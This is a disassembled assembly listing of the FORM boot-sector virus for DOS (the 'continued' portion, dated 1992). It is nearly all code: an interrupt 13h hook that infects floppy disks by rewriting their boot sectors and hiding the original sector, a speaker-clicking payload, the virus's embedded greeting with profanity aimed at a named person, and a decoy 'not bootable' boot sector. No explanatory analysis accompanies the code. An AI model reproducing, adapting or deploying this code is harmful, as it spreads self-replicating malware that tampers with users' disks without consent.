PAGE  59,132

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                 FORM2                        ;;
;;;                                      ;;
;;;      Created:   12-Mar-92                            ;;
;;;      Version:                                ;;
;;;      Code type: zero start                           ;;
;;;      Passes:    9          Analysis Options on: OQRS             ;;
;;;                                      ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;
;
; FORM - virus cont. 
;                          head  = 1
;              sec   = 4 (original boot sector = 5)
;                          cyl   = 1
;
;                       ( 720kb )
;
.286c


seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a


        org 0

form2       proc    far

start:
        pop di
        test    word ptr [bx+si],0FFF0h
        jnz loc_1           ; Jump if not zero
        or  word ptr [bx+si],0FF70h
        jmp short loc_2     ; (0024)
loc_1:                      ;  xref 91AF:0005
        add si,2
        inc di
        cmp di,word ptr ds:[5]  ; (91AF:0005=675h)
        jae loc_5           ; Jump if above or =
        cmp si,200h
        jb  $-2Eh           ; Jump if below
        sub si,200h
        inc cx
        jmp short $-3Fh
loc_2:                      ;  xref 91AF:000B
        mov al,byte ptr ds:[10h]    ; (91AF:0010=47h)
        mov byte ptr ds:[7],al  ; (91AF:0007=81h)
loc_3:                      ;  xref 91AF:004F
        mov ax,302h
        cmp si,1FFh
        je  loc_4           ; Jump if equal
        dec ax
loc_4:                      ;  xref 91AF:0031
        pushf               ; Push flags
        call    dword ptr ds:[41h]  ; (91AF:0041=0F6C1h)
        jc  loc_5           ; Jump if carry Set
        add cl,byte ptr ds:[16h]    ; (91AF:0016=49h)
        dec cx
        mov ax,cx
        div byte ptr ds:[18h]   ; (91AF:0018=0FEh) al,ah rem = ax/data
        mov cl,ah
        mov dh,al
        inc cx
        dec byte ptr ds:[7]     ; (91AF:0007=81h)
        jnz loc_3           ; Jump if not zero
        mov ax,di
        mov cl,byte ptr ds:[0Dh]    ; (91AF:000D=83h)
        dec cx
        shl ax,cl           ; Shift w/zeros fill
        add ax,word ptr ds:[3]  ; (91AF:0003=0FFF0h)
        clc             ; Clear carry flag
        retn
loc_5:                      ;  xref 91AF:0015, 0039
        stc             ; Set carry flag
        retn

form2       endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   91AF:00C5, 00DE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_1       proc    near
        mov bl,byte ptr ds:[18h]    ; (91AF:0018=0FEh)
        mov bh,bl
        mov cl,byte ptr ds:[1Ah]    ; (91AF:001A=2)
        dec cx
        shl bl,cl           ; Shift w/zeros fill
        div bl          ; al, ah rem = ax/reg
        mov ch,al
        xor dh,dh           ; Zero register
        cmp ah,bh
        jb  loc_6           ; Jump if below
        sub ah,bh
        mov dh,1
loc_6:                      ;  xref 91AF:0077
        inc ah
        mov cl,ah
        retn
sub_1       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;
;         Called from:   91AF:0157
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_2       proc    near
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    es
        push    ds
        push    cs
        pop ds
        push    cs
        pop es
        mov bx,3F9h
        xor dh,dh           ; Zero register
        mov cx,3

locloop_7:                  ;  xref 91AF:00A5
        push    cx
        mov ax,201h
        mov cx,1
        pushf               ; Push flags
        call    dword ptr ds:[41h]  ; (91AF:0041=0F6C1h)
        pop cx
        jnc loc_9           ; Jump if carry=0
        loop    locloop_7       ; Loop if cx > 0

loc_8:                      ;  xref 91AF:00B0, 00B7
        jmp loc_11          ; (013F)
loc_9:                      ;  xref 91AF:00A3
        cmp word ptr [bx+3Fh],0FE01h
        nop             ;*ASM fixup - displacement
        je  loc_8           ; Jump if equal
        cmp word ptr [bx+0Bh],200h
        jne loc_8           ; Jump if not equal
        call    $-128h
        call    $-10Eh
        call    $-0EAh
        jc  loc_11          ; Jump if carry Set
        push    ax
        call    sub_1           ; (0062)
        mov word ptr ds:[4Dh],cx    ; (91AF:004D=7)
        mov word ptr ds:[4Fh],dx    ; (91AF:004F=0D975h)
        pop ax
        inc ax
        cmp byte ptr ds:[0Dh],2 ; (91AF:000D=83h)
        je  loc_10          ; Jump if equal
        call    $-104h
        jc  loc_11          ; Jump if carry Set
loc_10:                     ;  xref 91AF:00D7
        call    sub_1           ; (0062)
        mov word ptr ds:[49h],cx    ; (91AF:0049=41F0h)
        mov word ptr ds:[4Bh],dx    ; (91AF:004B=0EFEh)
        mov ax,201h
        mov bx,3F9h
        mov cx,1
        xor dh,dh           ; Zero register
        pushf               ; Push flags
        call    dword ptr ds:[41h]  ; (91AF:0041=0F6C1h)
        jc  loc_11          ; Jump if carry Set
        mov ax,301h
        mov cx,word ptr ds:[49h]    ; (91AF:0049=41F0h)
        mov dx,word ptr ds:[4Bh]    ; (91AF:004B=0EFEh)
        mov byte ptr ds:[4Bh],0 ; (91AF:004B=0FEh)
        pushf               ; Push flags
        call    dword ptr ds:[41h]  ; (91AF:0041=0F6C1h)
        jc  loc_11          ; Jump if carry Set
        mov ax,301h
        mov bx,1FEh
        mov cx,word ptr ds:[4Dh]    ; (91AF:004D=7)
        mov dx,word ptr ds:[4Fh]    ; (91AF:004F=0D975h)
        mov byte ptr ds:[4Fh],0 ; (91AF:004F=75h)
        pushf               ; Push flags
        call    dword ptr ds:[41h]  ; (91AF:0041=0F6C1h)
        jc  loc_11          ; Jump if carry Set
        call    $-19Bh
        mov bx,3F9h
        mov ax,301h
        mov cx,1
        xor dh,dh           ; Zero register
        pushf               ; Push flags
        call    dword ptr ds:[41h]  ; (91AF:0041=0F6C1h)
loc_11:                     ;  xref 91AF:00A7, 00C2, 00DC, 00F9
                        ;            0110, 012A
        pop ds
        pop es
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        retn
sub_2       endp

        cmp dl,80h
        jae loc_12          ; Jump if above or =
        cmp ah,2
        jne loc_12          ; Jump if not equal
        cmp ch,0
        jne loc_12          ; Jump if not equal
        call    sub_2           ; (0082)
loc_12:                     ;  xref 91AF:014B, 0150, 0155
        jmp dword ptr cs:[41h]  ; (91AF:0041=0F6C1h)
        push    ax
        in  al,61h          ; port 61h, 8255 port B, read
        mov ah,al
        or  al,3
        out 61h,al          ; port 61h, 8255 B - spkr, etc
        push    cx
        mov cx,1000h

locloop_13:                 ;  xref 91AF:016C
        loop    locloop_13      ; Loop if cx > 0

        pop cx
        mov al,ah
        out 61h,al          ; port 61h, 8255 B - spkr, etc
                        ;  al = 0, disable parity
        pop ax
        jmp dword ptr cs:[45h]  ; (91AF:0045=8A00h)
        db  'The FORM-Virus sends greetings t'





        db  'o everyone who', 27h, 's reading'



        db  ' this text.FORM doesn', 27h, 't '



        db  'destroy data! Don', 27h, 't pani'



        db  'c! Fuckings go to Corinne.'




        db  0EBh, 3Ch, 90h, 47h, 45h,0EBh
        db  '<;GEOWORKS'

        db   00h, 02h, 02h, 01h, 00h, 02h
        db   70h, 00h,0A0h, 05h,0F9h, 03h
        db   00h, 09h, 00h, 02h, 00h
        db  8 dup (0)
        db   01h, 00h, 29h,0B7h, 26h, 00h
        db   00h
        db  '-R-        '

        db  8 dup (0)
        db  0E8h, 00h, 00h

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_3       proc    near
        pop si
        add si,11h
loc_14:                     ;  xref 91AF:024E
        lodsb               ; String [si] to al
        or  al,al           ; Zero ?
        jz  loc_15          ; Jump if zero
        mov ah,0Eh
        int 10h         ; Video display   ah=functn 0Eh
                        ;  write char al, teletype mode
        jmp short loc_14        ; (0245)
loc_15:                     ;  xref 91AF:0248, 0250
        jmp short loc_15        ; (0250)
sub_3       endp

        db  'This disk is not bootable.', 0Dh




        db  0Ah, 'System HALTED', 0Dh, 0Ah


        db  385 dup (0)
        db   55h,0AAh

seg_a       ends



        end start

;;;;;;;;;;;;;;;;;;;; CROSS REFERENCE - KEY ENTRY POINTS ;;;;;;;;;;;;;;;;;;;

    seg:off    type    label
   ---- ----   ----   ---------------
   91AF:0000   far    start

 ;;;;;;;;;;;;;;;;;; Interrupt Usage Synopsis ;;;;;;;;;;;;;;;;;;

        Interrupt 10h :  write char al, teletype mode

 ;;;;;;;;;;;;;;;;;; I/O Port Usage Synopsis  ;;;;;;;;;;;;;;;;;;

        Port 61h   : 8255 port B, read
        Port 61h   : 8255 B - spkr, etc
